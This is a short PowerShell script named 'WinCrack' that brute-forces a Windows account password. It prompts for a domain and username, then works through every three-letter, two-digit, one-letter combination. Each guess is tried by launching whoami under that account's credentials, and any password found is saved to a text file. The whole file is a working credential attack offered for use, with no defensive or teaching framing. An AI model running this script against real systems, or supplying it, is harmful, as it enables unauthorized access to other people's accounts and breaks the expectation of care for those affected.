[console]::Title = "WinCrack"
[console]::ForegroundColor = 'green'

function win {
    function check ($cmd, $username, $password, $domain) {
        try {
            $ps = New-Object System.Diagnostics.ProcessStartInfo
            $ps.FileName = $cmd
            $ps.UseShellExecute = $false
            $ps.UserName = $username
            $pass = ConvertTo-SecureString $password -AsPlainText -Force
            $ps.Password = $pass
            $ps.Domain = $domain
            [System.Diagnostics.Process]::Start($ps) | Out-Null
            "1"
        } catch {
            "0"
        }
    }

    # --- LLLNNL setup ---
    $letters = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')
    $numbers = 0..9

    Write-Host "Windows user password attack"
    $dom = Read-Host -Prompt "Domain"
    $user = Read-Host -Prompt "Username"

    $dt = (Get-Date).DateTime
    Write-Host "Started attack at $dt"

    foreach ($l1 in $letters) {
        foreach ($l2 in $letters) {
            foreach ($l3 in $letters) {
                foreach ($n1 in $numbers) {
                    foreach ($n2 in $numbers) {
                        foreach ($l4 in $letters) {
                            $combo = "$l1$l2$l3$n1$n2$l4"
                            $run = check -username $user -password $combo -domain $dom -cmd whoami
                            Write-Host "Trying $combo ..." -ForegroundColor Cyan

                            if ($run -eq "1") {
                                $dt = (Get-Date).DateTime
                                Write-Host "[DONE] Password found: $combo at $dt" -ForegroundColor Green
                                
                                # Save the winning combo to a file for rizz purposes
                                $combo | Out-File -FilePath "sigma_rizz_password.txt" -Encoding UTF8
                                return
                            }
                        }
                    }
                }
            }
        }
    }

    Write-Host "All combos attempted. No password found." -ForegroundColor Red
}

while ($true) {
    win
}
